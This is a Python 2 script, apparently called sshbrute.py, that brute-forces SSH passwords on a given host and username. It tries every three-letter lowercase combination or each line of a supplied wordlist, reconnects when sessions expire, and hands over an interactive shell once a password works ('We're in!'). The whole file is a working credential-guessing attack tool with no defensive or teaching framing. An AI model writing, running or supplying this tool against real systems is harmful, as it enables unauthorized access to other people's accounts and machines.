#!/usr/bin/python2

import itertools
from itertools import product
from string import ascii_lowercase
import pexpect
import sys

#this is the login function but uses the generated list of all possible lowercase 3 letter combinations
#it uses the itertools product function to generate all possible 3 letter combinations
def trylogin_withpasswdgen(host, user):
	
	# construct the login string
	connStr = "ssh" + " " + user + "@" + host

	# use 'spawn' to create the process
	child = pexpect.spawn(connStr)

	# look for the password prompt
	child.expect('password:')

	# simulate typing in the password using the passwords from a lists

	for line in passwds:
		password = line.strip()
		child.sendline(password)
		print "Trying password: %s" % line.strip()
		ret = child.expect(['\$', 'try again', pexpect.EOF])
		if ret == 0:
			# success!
			print "Found correct password! Accessing command line."
			print "We're in!"
			child.sendline() #needed to get the prompt itself.
			child.interact() #give control of the child to the user.
			quit()
		elif ret == 2:
			child = pexpect.spawn(connStr)
			child.expect('password:')
			print "Password incorrect. Maximum attempts reached, session expired. \nReconnecting\n..."

			
		else:
			print "Password incorrect, retrying."
			child.expect('password:')

	
# Login function using a give password list
def trylogin_withpasswordfile(host, user):
	
	# construct the login string
	connStr = "ssh" + " " + user + "@" + host

	# use 'spawn' to create the process
	child = pexpect.spawn(connStr)

	# look for the password prompt
	child.expect('password:')

	# simulate typing in the password using the passwords from a file
	try:
		fvar = open(passwordfile, "r")
	except:
		print "\nFile not found"
		quit()

	for line in fvar:
		password = line.strip()
		child.sendline(password)
		print "Trying password: %s" % line.strip()
		ret = child.expect(['\$', 'try again', pexpect.EOF])
		if ret == 0:
			# success!
			print "Found correct password! Accessing command line."
			print "We're in!"
			child.sendline() #needed to get the prompt itself.
			child.interact() #give control of the child to the user.
			quit()
		elif ret == 2:
			child = pexpect.spawn(connStr)
			child.expect('password:')
			print "Password incorrect. Maximum attempts reached, session expired. \nReconnecting\n..."

			
		else:
			print "Password incorrect, retrying. "
			child.expect('password:')

# Command line arguments for sshbrute.py
if sys.argv[1] == "-g":
	#generates passwords using itertools
	print "ATTEMPTING LOGIN USING PASSWORD GENERATION FUNCTION."
	passwds = [''.join(i) for i in itertools.product(ascii_lowercase, repeat = 3)]
	hostname = sys.argv[2]
	username = sys.argv[3]
	trylogin_withpasswdgen(hostname, username)
	quit()
else:
	passwordfile = sys.argv[1]
	hostname = sys.argv[2]
	username = sys.argv[3]
	trylogin_withpasswordfile(hostname, username)
			




